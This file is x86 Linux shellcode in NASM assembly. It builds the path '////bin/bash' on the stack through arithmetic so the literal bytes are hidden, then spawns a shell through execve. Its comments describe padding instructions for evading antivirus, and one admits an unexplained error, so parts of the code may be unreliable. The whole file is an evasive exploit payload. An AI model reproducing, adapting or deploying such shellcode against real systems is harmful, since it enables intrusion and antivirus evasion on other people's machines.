global _start

section .text
; Can use The follow depending on buffer size
; to assist in bypassing av 
; set / clear / complement carry flag
;	clc
;	stc
;	cmc
;	nop


_start:
	; PUSH the first null dword
	xor eax, eax
	push eax


	; PUSH ////bin/bash (12)
	;push 0x68736162
	mov eax, 0x3439B0B1
	mov bl, 0x2
	mul ebx
	;add eax, 0x3439B0B1
        ;push eax
	mov dword [esp-4], eax


	;push 0x2f6e6962
	sub eax, 0x3904F801
	dec eax
	;push eax
	mov dword [esp-8], eax

	; Always errors still nit sure why
	; sub eax,0x112f2f2f
	; xor byte [eax], 0xAA
	push 0x2f2f2f2f

	mov ebx, esp

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
